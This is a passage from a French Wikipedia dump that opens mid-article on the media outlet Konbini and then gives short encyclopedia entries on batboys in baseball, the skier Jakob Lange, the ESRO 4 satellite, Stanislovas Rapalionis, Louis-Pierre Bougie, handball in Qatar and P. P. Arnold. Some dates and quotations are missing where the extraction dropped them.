"Konbini" dispose de bureaux à Paris, et de 2017 à 2019 en Suisseet au Nigeria.
En 2022, "Konbini" comptait environ 4,9 millions de visiteurs uniques par mois sur son site internet. Sur les réseaux sociaux, le média comptait 15 millions de followers au travers de ses comptes sur Facebook, Instagram, TikTok, Snapchat et Youtube.
Depuis 2017.
À l'occasion de la campagne pour l'élection présidentielle française de 2017, "Konbini" lance « Speech », un format dédié aux sujets de société et à la politique.
"Konbini" produit également "Boza", un documentaire de quatorze minutes sur le sauvetage des migrants en mer Méditerranée à bord de l"'Aquarius", affrété par l'ONG SOS Méditerranée.
En , Hugo Clément, ancien journaliste du "Petit Journal" puis de "Quotidien", rejoint "Konbini". Il lance la plateforme "Konbini News" au début du mois de février, avec une stratégie éditoriale qui vise à proposer de longs reportages de terrain sur des sujets originaux et fournir des éclairages sur l'actualité politique et culturelle, à dimension internationale.
Les reportages de "Konbini News" traitent de thémes variés : l'emprisonnement de femmes au Salvador, la vie dans le village le plus froid du monde, la perception de l'homosexualité en Tunisie, entre autres. Dans le cadre de la journée internationale des femmes, Hugo Clément interviewe Nikita Bellucci, ancienne actrice pornographique victime de harcèlement sexuel.
"Konbini" est l'un des premiers medias français à mettre en place une campagne de levée de fonds à la suite de l'un de ses reportages. En , après la diffusion d'un reportage sur la famine au Kasaï, les équipes lèvent auprès de jeunes lecteurs pour l'association Action contre la faim.
À la fin du mois de , "Konbini" accompagne le président de la République Emmanuel Macron lors de sa première tournée en Afrique.
Le , "Konbini" et France Inter s'associent pour lancer la journée "Le plastique non merci" qui connaît un vif succès sur les réseaux sociaux. Le Parlement européen annonce le même jour son ambition d'interdire la commercialisation du plastique à usage unique dans toute l'Union européenne d'ici 2021 en reprenant le mot-dièse #Leplastiquenonmerci.
Peu après l’entrée de la famille Perrodo au capital, "Konbini" ferme la plupart de ses bureaux à l’étranger (États-Unis, Grande-Bretagne, Nigéria, Allemagne). En , "Konbini" ferme son bureau suisse situé à Vevey, ouvert en 2017.
Selon "Capital", les pertes de financières de "Konbini" ont quadruplé en 2019 et les départs se sont multipliés au sein de son état-major ces dernières années. Les relations entre les différents actionnaires de "Konbini" se sont tendues et à l’été 2020, la société a demandé au tribunal de commerce la nomination d’un mandataire ad hoc qui pourrait être lié à un blocage entre actionnaires. , justifie David Creuzot dans un entretien à "France Culture".
En 2020, un représentant de la famille Perrodo, Irakliy Lobzhanidze, le Directeur du développement de "Konbini" depuis 2018 et ancien banquier chez Rothschild , est nommé directeur général. Après cette nomination, la quasi-totalité de l’équipe de direction a été remplacé.
En 2022, selon "Le Figaro", "Konbini" enfin parvient à la rentabilité après plusieurs années de restructuration, notamment grâce à l’optimisation des coûts et à la croissance continue de son chiffre d’affaires (qui s’est vu quasiment doublé entre 2018 et 2022, pour atteindre environ 20 millions d'euros en 2022). "Konbini" recentre ses activités sur le marché français (en fermant définitivement ses bureaux au Mexique, aux États-Unis, au Nigeria et en Suisse), pour préserver ses parts de marché en France face à l'arrivée des concurrents comme "Brut", "Loopsider" et autres.
En février 2023, "Konbini" annonce un partenariat stratégique avec M6 pour lancer une chaîne Fast Konbini 24/24 sur 6play.
En juin 2023, Irakli Lobzhanidze quitte ses fonctions de directeur général.
En septembre 2023, "Le Figaro" révèle que DC Company, propriétaire entre autres du site satirique "Le Gorafi", est entré en négociations exclusives avec la famille Perrodo pour le rachat de "Konbini". Le rachat d'une part majoritaire par DC Company se concrétise début 2024. Selon "La Lettre", l'opération approche les 40 millions d'euros et en partie grâce à un échange d'actions. D'après un accord scellé le , Geoffrey La Rocca cède 36 % du capital de son groupe de médias DC Company aux Perrodo et aux fondateurs de "Konbini" (Lucie Beudet et David Creuzot, qui possédaient toujours 20 % du média) contre les actions de "Konbini".
Critiques et controverses.
Durant l'été 2017, "Le Monde diplomatique" dépeint un site où les journalistes sont au service des marques et travaillent dans des conditions difficiles. L'article fait témoigner plusieurs salariés ou anciens salariés, qui dénoncent les méthodes de la rédaction, ainsi que le recours à des auto-entrepreneurs pour créer du contenu. , déclare ainsi un salarié.
Fin , "Konbini" publie une vidéo sur les « techniques de drague » dans laquelle apparaît un homme recommande de . Face au tollé provoqué, accusée de participer à la culture du viol, la vidéo est retirée du site internet. La rédaction et son rédacteur en chef présentent leurs excuses.
Pour les journalistes Sophie Eustache et Jessica Trochet du "Monde diplomatique", les recettes du site reposent sur la publicité, ce qui maintient "Konbini" dans une forte dépendance vis-à-vis des annonceurs et conduit la rédaction à s'autocensurer pour éviter de les contrarier : . La rédaction en chef maintient cependant conserver une relative liberté de ton et de traitement, sous les angles prédéfinis du site, à savoir une approche pop du sport.
En , un article publié par un journaliste du site "Arrêt sur images" révèle qu'une interview d’Emmanuel Macron réalisée par "Konbini" au Niger a été tournée par Ariane Vincent, directrice éditoriale et directrice de la communication de "Konbini", ancienne responsable de la communication au Parti socialiste entre et , et directrice de la campagne numérique de François Hollande en 2012. L'article souligne un mélange des genres et questionne le fond de l'interview ainsi que le rôle de Konbini : . À la suite de la publication de l'article, Ariane Vincent met en cause son auteur et annonce que ce dernier a postulé chez "Konbini" en novembre, elle propose en outre d'apporter une preuve à ses dires. Elle provoque une polémique en choisissant de mettre publiquement en cause le journaliste tout en ne s'exprimant pas sur le fond de l'article, avant de présenter ses excuses une heure plus tard sur Twitter.
"Konbini" est accusé de s'engager sur certains thèmes sujets à débat, de manière que leurs articles soient plus partagés et donc qu'ils génèrent plus d'audience.
En 2020, "Konbini" est accusé d'écoblanchiment en faisant une série d'articles appelée "Eco Good News" en partenariat avec l'entreprise Perrier, propriété du groupe Nestlé. Ce partenariat est notamment critiqué par le journal en ligne "Mr. Mondialisation".
Le , "Konbini" met en ligne une vidéo donnant de fausses informations. Le compte Twitter de "Konbini" introduit la vidéo avec une information relayée dans des sites militants comme SOS Papa prétendant qu'il existe en France privés de droits de visites. Après avoir été vue près de , la vidéo est retirée du site après cinq heures.
En , le site d'information "Arrêt sur images" critique la mise en place de « partenariats » s'apparentant à du marketing de contenu avec l'association antispéciste L214, sans le mentionner aux internautes. De ce fait, ce média est qualifié de « sympathisant » par L214. Des contenus sont ainsi produits par "Konbini", sur la base de vidéos et de textes directement fournis par L214. Selon l'enquête d"'Arrêt sur images", . La direction de "Konbini" indique ne pas avoir eu connaissance de cette collaboration étroite avec L214 organisée par le journaliste Hugo Clément, alors employé du média.
Condamnation.
Après que "La Lettre A" a révélé en 2019 que la famille Perrodo comptait parmi les principaux actionnaires de Konbini, ce dernier entame des poursuites en diffamation, qualifiées par "Libération" de procédure-bâillon ; en , le média d'info-divertissement est débouté et condamné à de dommages-intérêts pour procédure abusive par la du tribunal judiciaire de Paris.

</doc>
<doc id="8730739" url="https://fr.wikipedia.org/wiki?curid=8730739" title="Batboy">
Batboy

Un batboy est le nom donné à un préposé au bâton employé sur un terrain de baseball. Le terme batgirl est aussi employé au féminin.
Les "batboys" font partie du baseball organisé depuis les années 1880, soit depuis les premières années d'existence de ce sport. Leurs fonctions se confondaient souvent à cette époque avec celle de mascotte pour le club.
Rôle.
Les "batboys" sont souvent des enfants ou des adolescents. Leur désignation vient du fait qu'ils sont chargés de récupérer et ramener à l'abri des joueurs les bâtons de baseball ("baseball bat" en anglais) abandonnés sur le terrain par un joueur après une frappe. On leur assigne en cours de match la tâche de récupérer ou d'apporter au joueur différentes pièces d'équipement. Par exemple, un "batboy" ira sur le terrain durant un arrêt de jeu pour récupérer et ramener à l'abri des joueurs les gants ou une pièce d'équipement (par exemple une jambière) dont un frappeur n'a plus besoin une fois qu'il a terminé son tour au bâton, a atteint les buts et est devenu coureur.
Un "batboy" a aussi pour tâche d'apporter des balles de baseball à l'arbitre au marbre.
Les "batboys" sont parfois aussi considérés par le club comme "assistants au vestiaire" ("clubhouse assistant") ou encore sont promus à cette fonction lorsqu'ils sont plus âgés. Pour ceux plus âgés, les tâches ne se limitent pas à ramasser les bâtons et porter les balles à l'arbitre : ils sont aussi chargés d'assister les joueurs en leur rendant divers services et en préparant l'équipement dans les heures précédant le match. Les émoluments des "batboys" modernes sont souvent bonifiés par les pourboires offerts par les joueurs de niveau majeur ou des étrennes en fin de saison.
Le "batboy" est vêtu de l'uniforme du club pour lequel il travaille. Il porte habituellement un casque protecteur pour se protéger des fausses balles. Un numéro ou son nom peuvent être inscrits au dos de la chemise de son uniforme. Parfois, le mot « BATBOY » sera simplement inscrit.
Dans les Ligues majeures de baseball, les "batboys" ne voyagent habituellement pas avec un club en déplacement, à moins qu'il ne s'agisse d'un membre de la famille d'un des joueurs ou d'un entraîneur. L'équipe hôte fournira généralement les préposés, engagés localement. Qu'il existe ou non un lien filial, ils sont néanmoins souvent considérés comme des membres de la « famille », contribuant au climat de camaraderie dans un vestiaire. Certains clubs leur offrent par exemple des bagues de champions si l'équipe remporte un titre important, ou les invitent aux festivités suivant la conquête d'un championnat.
Histoire.
Les "batboys" font partie du baseball organisé depuis les années 1880, soit depuis les premières années d'existence de ce sport. Leurs fonctions se confondaient souvent à cette époque avec celle de mascotte pour le club. Certains, très appréciés des membres du club, étaient populaires au point d'être considérés comme des porte-bonheur par les joueurs plus superstitieux.
Il n'était pas rare que les "batboys" de cette époque soient des enfants montrant quelque caractéristique physique distinctive (petite taille, albinisme) ou handicap. Avant la Première Guerre mondiale, il était commun que des joueurs ou des entraîneurs abordent au hasard quelque enfant de la rue et lui offrent l'entrée gratuite au stade en échange de services similaires à ceux rendus par les "batboys" modernes.
"Batboys" célèbres.
L'un des "batboys" et mascottes les plus connues du grand public est Eddie Bennett (1903-1935). Adolescent de petite taille (, bossu et laissé orphelin par la mort de ses parents victimes de la grippe de 1918, Bennett convainc un joueur des White Sox de Chicago, Happy Felsch, qu'il possède des « pouvoirs mystiques » et devient une sorte de porte-bonheur pour le sportif. Il est engagé par les White Sox l'année suivante mais quitte le club après le scandale des Black Sox, où plusieurs joueurs, dont Felsch, conspirent pour intentionnellement perdre la Série mondiale 1919. Le jeune homme est ensuite à l'emploi des Robins de Brooklyn avant d'être engagé par les Yankees de New York. Il est "batboy" et mascotte pour les Yankees durant les années 1920 et 1930.
En 2008, Stan Bronson, Jr. entre dans le "Livre Guinness des records" comme détenteur du record de longévité pour un "batboy". L'homme né le est depuis 1958 le préposé au bâton des Tigers de l'université de Memphis, en plus d'être employé par l'équipe de football de l'université. En 2013, Bronson est toujours à l'emploi des Tigers.
Teddy Kramer, un homme atteint de trisomie 21, est "batboy" d'un jour pour les Reds de Cincinnati en août 2012 et sa popularité lui a valu d'avoir sa propre carte de baseball incluse dans la collection de la compagnie Topps.
Certains "batboys" sont éventuellement devenus eux-mêmes joueurs des Ligues majeures et ont souvent obtenu leur premier emploi sur un terrain de baseball grâce à leur père. Bret Boone et Pete Rose, Jr., respectivement fils des joueurs Bob Boone et Pete Rose, ont été "batboys" pour l'équipe championne des Phillies de Philadelphie en 1980, avec le jeune Rubén Amaro, Jr., fils de Rubén Amaro, Sr., qui était alors l'un des instructeurs du club. Tous trois ont joué dans les majeures, Amaro, préposé au bâton jusqu'en 1983, devenant même joueur puis directeur-gérant des Phillies. Jesse Litsch fut "batboy" des Devil Rays de Tampa Bay avant de devenir à l'âge adulte lanceur des Blue Jays de Toronto. À l'âge de 12 ans, Cameron Maybin fut "batboy" dans les ligues mineures, où son potentiel pour une carrière sportive fut remarquée. Brett Bochy fut préposé au bâton des Padres de San Diego lorsque dirigés par son père Bruce. En 2010, le joueur Orlando Cabrera des Reds de Cincinnati, suit le parcours professionnel inverse : alors qu'il est sur la liste des blessés, il revêt un uniforme de "batboy" et s'improvise préposé au bâton pour un match.
Le Thunder de Trenton, une équipe mineure de l'Eastern League affiliée aux Yankees de New York du baseball majeur, dresse depuis 2002 des "Bat Dogs", c'est-à-dire des chiens golden retriever entraînés à ramener les bâtons laissés sur le terrain. Le "Bat Dog" original, , a reçu une attention médiatique appréciable jusqu'à sa « retraite », peu avant sa mort à l'âge de 13 ans en 2013, étant même honoré au Yankee Stadium de New York. Le club emploie depuis 2008 le chien Derby et depuis 2013 son fils Rookie, deux animaux de la même lignée.
Incidents.
Depuis janvier 2003, la Ligue majeure de baseball exige que les "batboys" présents sur ses terrains soient âgés d'au moins 14 ans. La décision est prise après un incident célèbre survenu lors du de la Série mondiale 2002 au Pacific Bell Park de San Francisco. L'une des équipes participantes, les Giants de San Francisco, employait comme préposé au bâton Darren Baker, le fils âgé de 3 ans et demi du gérant des Giants, Dusty Baker. En manche du match contre les Angels d'Anaheim, Kenny Lofton des Giants frappe un triple qui fait marquer deux points. Le jeune Darren se précipite sur le terrain pour faire son travail, c'est-à-dire récupérer le bâton de baseball de Lofton, mais il se retrouve dans la zone de jeu beaucoup trop tôt. Le premier joueur des Giants à marquer un point, J. T. Snow, soulève le jeune Baker et l'amène en lieu sûr pour éviter, de justesse, qu'il soit impliqué dans une dangereuse collision au marbre lorsqu'un second joueur, David Bell, arrive à vive allure pour marquer à son tour.
En 1991, le gérant des Dodgers de Los Angeles, Tommy Lasorda, est mis à l'amende par la Ligue nationale pour avoir invité dans l'abri des joueurs l'acteur Tony Danza pour en faire une mascotte et un "batboy" invité.
En 2007, Kirk Radomski, "batboy" des Mets de New York de 1985 à 1995, est condamné pour distribution illégale entre 1995 et 2005 de stéroïdes anabolisants, d'hormone de croissance, d'amphétamines et de clenbutérol au personnel des Ligues majeures de baseball.

</doc>
<doc id="8730741" url="https://fr.wikipedia.org/wiki?curid=8730741" title="Richarde">
Richarde



</doc>
<doc id="8730751" url="https://fr.wikipedia.org/wiki?curid=8730751" title="Jakob Lange">
Jakob Lange

Jakob Lange, né le à Flintsbach am Inn, est un coureur du combiné nordique allemand.
Il a remporté cinq médailles lors des championnats du monde junior de ski nordique entre 2013 à 2015. En 2017, il signe une quatrième place en coupe du monde ainsi qu'un podium par équipes lors du Grand Prix d'été. En , il annonce faire une pause dans sa carrière en raison d'une blessure. Il revient à la compétition l'été suivant lors du Grand Prix d'été.
Biographie.
Débuts de carrière.
Il dit avoir démarré le saut à ski car il était trop léger pour faire du ski de fond. En 2011, il remporte la médaille d'argent avec David Welde lors du team sprint du Festival olympique d'hiver 2011 de la jeunesse européenne. En , il débute en coupe continentale à Soldier Hollow de très bons résultats : une , une et une place. Quelques semaines plus tard, il remporte avec ses coéquipiers la course de relais aux Championnats du monde junior de Liberec en 2013. 
Arrivée en coupe du monde.
Un mois plus tard, il fait ses débuts en Coupe du monde à Almaty où il se classe . En , il chute et se blesse à un genou lors d'une compétition à Seefeld. En , il signe son meilleur résultat individuel en coupe du monde une quatrième place à Sapporo. Il échoue à deux secondes du podium derrière Mikko Kokslien. Lors du Grand Prix d'été 2017, il termine avec Vinzenz Geiger du team sprint organisé à Oberwiesenthal. En , il met sa carrière entre parenthèses en raison de problèmes de santé. Il revient à la compétition lors du Grand Prix d'été.
Vie personnelle.
Il a terminé ses études en 2015. Il fait partie de l'.

</doc>
<doc id="8730754" url="https://fr.wikipedia.org/wiki?curid=8730754" title="Pallamano Buscaglione Rome">
Pallamano Buscaglione Rome

Le Buscaglione Rome est un club de handball situé à Rome en Italie.

</doc>
<doc id="8730755" url="https://fr.wikipedia.org/wiki?curid=8730755" title="Pruszków (homonymie)">
Pruszków (homonymie)

En Pologne, Pruszków désigne :&lt;br&gt;

</doc>
<doc id="8730764" url="https://fr.wikipedia.org/wiki?curid=8730764" title="Le Prix d'une folie">
Le Prix d'une folie

Le Prix d'une folie ("") est un film américain réalisé par Allan Dwan, sorti en 1925. 

</doc>
<doc id="8730766" url="https://fr.wikipedia.org/wiki?curid=8730766" title="C. H. O'D. Alexander">
C. H. O'D. Alexander



</doc>
<doc id="8730773" url="https://fr.wikipedia.org/wiki?curid=8730773" title="Oslo-Studentenes IL">
Oslo-Studentenes IL

L’Oslo-Studentenes IL (OSI) est un club de handball situé à Oslo en Norvège. Il a été fondé en 1945.

</doc>
<doc id="8730805" url="https://fr.wikipedia.org/wiki?curid=8730805" title="Sodium 24">
Sodium 24



</doc>
<doc id="8730806" url="https://fr.wikipedia.org/wiki?curid=8730806" title="Arsenic 76">
Arsenic 76



</doc>
<doc id="8730812" url="https://fr.wikipedia.org/wiki?curid=8730812" title="ESRO 4">
ESRO 4

ESRO 4 ou ESRO IV est un satellite scientifique développé par le CERS (en anglais "ESRO") une des deux agences spatiales européennes qui ont précédé l'ESA. Son objectif était de déterminer la manière dont les particules émises par le Soleil pénétraient et interagissaient avec la magnétosphère terrestre. Le satellite lancé le 20/11/1972 a rempli sa mission avec succès. 
Historique.
"ESRO 4" fait partie des satellites de première génération développés par le CERS comportant plusieurs instruments scientifiques développés par plusieurs équipes. Le développement de ESRO IV est décidé en janvier 1969. Le cout est évalué à l'époque à 35-40 millions francs. Le satellite est construit par les sociétés Hawker Siddely Dynamics. Il est lancé le 20/11/1972 par une fusée américaine Scout depuis la base de lancement de Vandenberg et placé sur une orbite polaire avec un apogée de , un périgée de et une inclinaison de 91,1 degrés. L'orbite du satellite a évolué de manière à couvrir l'ensemble de la surface du globe grâce à une précession du périgée de 3,5 ° par jour. Le satellite a été détruit durant sa rentrée atmosphérique qui a eu lieu le 15 avril 1974.
Caractéristiques techniques.
Le corps du satellite est comme ESRO 2 de forme cylindrique, recouvert de cellules solaires, et sa masse est de . Il spinné c'est-à-dire stabilisé par la mise en rotation autour de son axe (1 tour par seconde). Les données qui sont stockées sur bande peuvent être transmises selon 3 modes dont le plus rapide a un débit de 10 kilobits par seconde. Le satellite emporte 5 expériences scientifiques :

</doc>
<doc id="8730817" url="https://fr.wikipedia.org/wiki?curid=8730817" title="ESRO IV">
ESRO IV



</doc>
<doc id="8730823" url="https://fr.wikipedia.org/wiki?curid=8730823" title="Hapoël Ramat Gan (handball)">
Hapoël Ramat Gan (handball)

Le Hapoël Ramat Gan est un club de handball situé à Ramat Gan en Israël.

</doc>
<doc id="8730841" url="https://fr.wikipedia.org/wiki?curid=8730841" title="Trichogaster chuna">
Trichogaster chuna



</doc>
<doc id="8730842" url="https://fr.wikipedia.org/wiki?curid=8730842" title="Jurisprudence Balladur">
Jurisprudence Balladur



</doc>
<doc id="8730843" url="https://fr.wikipedia.org/wiki?curid=8730843" title="Léon Saint-Réquier">
Léon Saint-Réquier



</doc>
<doc id="8730847" url="https://fr.wikipedia.org/wiki?curid=8730847" title="Stanislovas Rapalionis">
Stanislovas Rapalionis

Stanislovas Rapalionis (aussi connu sous le nom latin de : "Stanislaus Rapagellanus", ou de "Stanislaus" en "lituanien", ou en "polonais" : "Stanisław Rafajowicz") est un professeur en théologie lituanien né à Eišiškės en 1485 et décédé à Königsberg en 1545.
Il enseigne à l'université Albertina de Königsberg et fonde la première école en langue lituanienne à Vilnius. Il est le premier traducteur de la Bible en lituanien, même si aujourd'hui cette traduction a disparu.
Biographie.
Il vient d'une famille noble lituanienne et est un proche parent du théologien et traducteur . La signification de son nom, Rapalionis, est inconnue, et on sait peu de choses de sa jeunesse et de sa formation. Il est attesté qu'il a étudié à Cracovie et qu'il est devenu bachelier. Quand débute en Pologne la persécution des luthériens, il cherche refuge en Prusse. Albert de Brandebourg lui apporte son aide et l'envoie étudier à l'université de Wittemberg.
Il y fait de rapides progrès et est fait docteur en théologie le sous l'autorité de Martin Luther. Le duc l'a rappelé à lui auparavant mais le réformateur luthérien Johannes Bugenhagen persuade le duc de laisser Rapalionis à Wittemberg jusqu'à l'été. Il y enseigne en langue hébraïque et est définitivement rappelé le pour occuper une chaire de théologie à l'université Albertina de Königsberg. Il y est proche de Bugenhagen et de Philippe Mélanchthon, Luther le connaît également. Muni d'une lettre de recommandation de Mélanchthon, il se rend à Königsberg où il étudie le Livre des Psaumes.
Talentueux en langues et d'une grande culture théologique, fidèle aux enseignements du luthéranisme, il gagne vite en estime et renommée. On garde de lui une dissertation, "De ecclesia", où il expose l'essence de l'Église à la lumière de la Confession d'Augsbourg et des articles schmalkaldiques. Il est le premier théologien à enseigner à l'université de Königsberg. Ses leçons suscitent une grande attention, le duc Albert venant même y assister. Une lettre adressée à Paul Speratus laisse transparaître sa culture, sa faculté de jugement et sa capacité à se placer au-dessus des disputes de toutes sortes. Il sera conseiller de l'évêque sur les sujets relatifs à la Pologne et la Lituanie.
C'est avec lui que commence l'histoire littéraire lituanienne, il est le premier poète lituanien à composer dans sa langue un Chant de la Passion.
Il épouse en la fille du médecin du duc. Il meurt en 1545, quelques jours après sa première "disputatio".

</doc>
<doc id="8730851" url="https://fr.wikipedia.org/wiki?curid=8730851" title="Louis-Pierre Bougie">
Louis-Pierre Bougie

Louis-Pierre Bougie, né à Trois-Rivières, Québec, le et mort à Montréal, Québec, le d'une pneumonie, est un peintre et graveur canadien spécialisé en taille douce et en eau-forte après une longue formation aux ateliers Lacourière-Frélaut à Paris, où il a travaillé pendant plus de quinze ans, et lors de nombreux séjours de travail et d'étude en France, Portugal, Pologne, Irlande, Finlande et New York. Ses œuvres sont régulièrement exposées dans des galeries canadiennes, américaines et européennes. Plusieurs de ses œuvres font partie de grandes collections publiques et privées notamment au Québec et à New York. Bougie est le chef de file de la gravure au Québec, par la profondeur du propos et la continuité du travail.
Biographie.
Formation.
Après une initiation à la gravure à l’École des Beaux-Arts de Montréal, où il était étudiant libre dans les cours d’Angèle Beaudry, Louis-Pierre Bougie a poursuivi sa formation dans de nombreux ateliers, principalement à Paris, chez Lacourière-Frélaut (1979-1993), chez Tazé et Champfleury, et aussi à Vancouver et Montréal. Il a fait des séjours de formation à Strasbourg (1979-1982), à Cracovie (1980), à Helsinki (2003), à Buenos Aires (2006), renouant avec une tradition de transmission du métier dans les ateliers de taille-douce qui s’apparente au compagnonnage.
Louis-Pierre Bougie meurt le à Montréal.
Œuvre.
Louis-Pierre Bougie a produit un œuvre gravé et peint considérable, faisant appel aux techniques traditionnelles du burin, de l’aquatinte, du chine encollé, pour produire un travail en taille-douce résolument moderne. Bougie appartient à la grande lignée des Goya, Blake et Rops, il a développé une technique originale du monotype, qui met à contribution les procédés de la gravure pour intégrer des dessins réalisés à partir de modèles vivants. On assiste alors à une inversion de la technique : le papier est déjà dessiné à la pierre noire et rehaussé à l’acrylique avant de recevoir l’image de la plaque : une planche de cuivre encrée, qui aura été mordue au préalable par des badigeons d’acide (des crachis ou « spit-bites ») et quelques éraflures au grattoir. L’impression saisit le tout dans une transparence surnaturelle : à donner de la lumière, c’est bien ce que l’on entend par enluminure. Chez Bougie, la gravure devient un procédé qui permet d’ouvrir, et de sceller un espace, où le désir et l’imagination se déposent autrement dans la matière corporelle, où la lumière (par rehaut et par enluminure) fait remonter autrement l’apparaître et nous redonne une part de nous-mêmes.
Implication.
En 1975, Louis-Pierre Bougie vit à Outremont, voisin de Serge Fiori. Celui-ci lui demande d'effectuer l'illustration de "Si on avait besoin d'une cinquième saison", le second album du groupe Harmonium. Il utilise une technique mixte avec aquarelle, encre, peinture acrylique et pierre noire pour effectuer l'œuvre.
Au début des années 1980, alors qu’il multiplie les séjours dans des grands ateliers de gravure à l’étranger (Strasbourg, Paris, etc.) Louis-Pierre Bougie fonde – avec quelques artistes passionnés d’eau-forte (Pierre-Léon Tétreault, Kittie Bruneau, etc.) - l’Atelier circulaire. Il n’aura de cesse, tout au long de sa carrière, d’aider à promouvoir les œuvres gravées des artistes québécois, au Québec comme à l’extérieur du Canada, et à multiplier les liens avec le milieu littéraire. En 1983, dans un texte commun, les poètes Gaston Miron et Michaël La Chance ont envoyé un télégramme à Louis-Pierre Bougie :
« Nous saluons Louis-Pierre Bougie qui est de ceux qui, en devançant le lendemain augmente ses possibilités et dévie le temps de son encerclement mortel. » 
Sa réputation de buriniste hors pair et d’aquafortiste de renommée internationale a contribué à jouer ce rôle de diffusion et de valorisation de la gravure québécoise. Ce travail de médiateur, Bougie le joue de façon significative par les invitations qu’il lance à des artistes étrangers, pour une impression taille-douce d’un livre d’artiste (François-Xavier Marange), pour des résidences de production (Martin Müller-Reinhart), pour des échanges Québec-France-Québec-Taiwan, etc. Discret et solitaire, il a joué un rôle décisif pour encourager et promouvoir nombre d’artistes du Québec qui sont passés par l’Atelier circulaire ou à l’occasion d’expositions collectives qu’il organise et dont il a été commissaire.
Expositions solo.
De grands commissaires d’exposition ont soutenu cette œuvre, Léo Rosshandler, Bernard Lévy, Céline Mayrand, Gilles Daigneault, Claude Morissette, Anne-Marie Ninacs, etc. Côtoyer cette œuvre c’est suivre au pas à pas comment la pensée s’ouvre à des complicités dans l’expérience que nous faisons de certains lieux, en regard de certaines œuvres.
Expositions de livres d’artiste.
L’œuvre gravée de Louis-Pierre Bougie est, pour une part, dialogue avec la poésie : ce qui donnera lieu à quelques collaborations en galerie et surtout à des livres d’artistes où se rencontrent typographes, graveurs, poètes et relieurs. Louis-Pierre Bougie a collaboré avec plusieurs poètes : Gaston Miron (un « Après-dire » dans "Le Prince", un poème liminaire dans "Forger l’effroi"), Paul Chamberland, Geneviève Letarte (un livre), Jérôme Élie, Michel Butor (un livre), Michel van Schendel (deux livres), François-Xavier Marange (un livre), Paule Marier, Michaël La Chance (4 livres), etc. Ce sont des collaborations étroites où l’écrivain ne manque pas, à chaque fois, d’être impressionné par l’approche à la fois rude et sensible, rugueuse et édénique, que Bougie donne à la création. C’est ainsi que, dans un esprit de collaboration créatrice et d’amitié avec les poètes, de nombreux livres d’artistes voient le jour, lesquels seront rassemblés pour de grandes expositions :

</doc>
<doc id="8730867" url="https://fr.wikipedia.org/wiki?curid=8730867" title="Handball au Qatar">
Handball au Qatar

Cet article relate l'histoire du handball au Qatar.
Histoire.
L'Association qatarienne de handball est membre de l'IHF depuis 1978.
L'équipe du Qatar de handball fait sa première apparition sur la scène internationale en 1983 lors du championnats d'Asie organisé en Corée du Sud. Elle remporte sa première médaille en 2002 lors de la finale des championnats d'Asie en Iran, qu'elle perd face au Koweït.
Au début des années 2000, le club de l'Al-Sadd SC, basé à Doha, réussit à remporter quatre Ligues des champions d'Asie consécutives de 2000 à 2003 et parvient à remporter l'IHF Super Globe en 2002. Organisée par le Qatar à Doha, l'Al-Sadd SC termine en effet premier avec quatre victoires, ayant notamment battu les champions d'Europe du SC Magdebourg sur le score de 35 à 32. Depuis 2010, le Qatar organise annuellement la compétition mais n'a plus remporté de titre.
Le , le Qatar surprend en obtenant l'organisation des championnats du monde de handball 2015. L'année suivante, en 2012, la sélection atteint de nouveau la finale des championnats d'Asie mais perd face à la Corée du Sud alors que l'Al-Rayyan SC remporte sa première Ligue des champions de l'AHF, qu'il ne parviendra pas à conserver au profit d'El Jaish SC, autre club qatari. 
À partir de 2013, le Qatar, qui ne compte que quelques centaines de handballeurs licenciés, commence à faire appel à des joueurs naturalisés, notamment d'Europe de l'Est, pour pourvoir sa sélection nationale. Ceux-ci, attirés par d'importants salaires et sans avenir au sein de leur sélection d'origine, peuvent en effet intégrer l'équipe qatarie après naturalisation s'ils n'ont pas été sélectionnés par un autre pays au cours des trois années précédentes. C'est aussi en 2013 que Valero Rivera devient sélectionneur du Qatar. L'arrivée à la tête du projet de l'ancien entraîneur du FC Barcelone (1983 - 2003) et de l'équipe d'Espagne (2003 - 2008) convaincra de nombreux joueurs à être naturalisés. Dès l'année suivante, la sélection qatarie remporte ses premiers championnats d'Asie face au Bahreïn, pays organisateur.
En 2015, le Qatar organise les championnats du monde à Doha et Lusail. Seuls quatre joueurs de la sélection qatarie sur dix-sept sont natifs du pays. En phase de poule, l'équipe domine le Brésil, la Slovénie, le Chili et la Biélorussie mais bute face à l'Espagne, derrière qui elle termine deuxième du groupe. Lors de la phase finale, le Qatar élimine successivement les sélections autrichienne, allemande et polonaise, avant d'être opposée en finale à l'équipe de France, championne d'Europe en titre.

</doc>
<doc id="8730869" url="https://fr.wikipedia.org/wiki?curid=8730869" title="P. P. Arnold">
P. P. Arnold

Patricia Ann Cole née le à Los Angeles, est une chanteuse soul et rock américaine, mieux connue sous son nom de scène P.P. Arnold. Après avoir été choriste et danseuse aux États-Unis pour le groupe Ike &amp; Tina Turner Revue de 1964 à 1966, elle décide de vivre en Angleterre pour y faire carrière seule. Elle chante alors avec le groupe The Small Faces, puis avec Chris Farlowe &amp; The Thunderbirds en compagnie du guitariste Albert Lee et du batteur Carl Palmer avant de rencontrer le manager Andrew Loog Oldham, qui la met en contact avec le pianiste et organiste Keith Emerson, qui fonde alors le groupe The Nice afin de l'accompagner sur scène.
Biographie.
Elle se marie jeune et a deux enfants. En 1964, elle devient membre des choristes The Ikettes et accompagne en tournée le groupe de Ike &amp; Tina Turner. Alors qu'ils tournent en Angleterre, Pat quitte le groupe et s'installe à Londres pour une carrière solo. Elle est choriste sur les singles du groupe Small Faces, "Tin soldier" et "Itchycoo Park" en 1967. Elle participe aussi au single de Chris Farlowe &amp; The Thunderbirds, "Reach Out (I'll Be There)", une chanson qui se retrouve également sur l'album "The Art of Chris Farlowe", produit par Mick Jagger qui est lui aussi choriste.
En 1967, avec l'aide de son manager Andrew Loog Oldham, elle rencontre Keith Emerson qui monte alors un quatuor pour l'accompagner sur scène. Avec le guitariste-trompettiste David O'List, le bassiste Keith Lee Jackson et le batteur Ian Hague, naquit ainsi le groupe The Nice dont le nom est inspiré justement par une chanson des Small Faces "Here Come The Nice".
En 1967 toujours, elle chante avec Rod Stewart sur la face B d'un single la chanson "Come home baby", avec Ron Wood à la guitare, Keith Richards à la basse, Nicky Hopkins au piano, Keith Emerson à l'orgue Hammond et Micky Waller à la batterie.
En , elle se marie en secondes noces avec Bill Siddons (qui est le manager de The Doors entre 1968 et 1972).
